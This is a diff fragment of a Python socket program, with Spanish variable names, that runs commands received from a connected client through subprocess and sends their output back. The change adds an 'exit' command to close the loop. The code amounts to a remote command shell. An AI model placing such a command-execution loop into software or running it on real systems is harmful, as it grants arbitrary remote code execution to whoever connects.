@@ -31,15 +31,15 @@ while True:
     while True:
 
         data = str(socket_cliente.recv(4096), "utf-8")
-        datos = data.split()   
-        fin = sp.Popen(datos, stdout=sp.PIPE, universal_newlines=True, stderr=sp.PIPE) #, shell=True
-        output_full = fin.communicate()
-        salida = output_full[0]
-        error = output_full[1]
-        socket_cliente.send(salida.encode("utf-8"))
-        socket_cliente.send(error.encode("utf-8"))
-
-        if not data:
+        if data != "exit":
+            datos = data.split()
+            fin = sp.Popen(datos, stdout=sp.PIPE, universal_newlines=True, stderr=sp.PIPE) #shell=True
+            output_full = fin.communicate()
+            salida = output_full[0]
+            error = output_full[1]
+            socket_cliente.send(salida.encode("utf-8"))
+            socket_cliente.send(error.encode("utf-8"))
+        elif data == "exit":
             break
 
     socket_cliente.close()
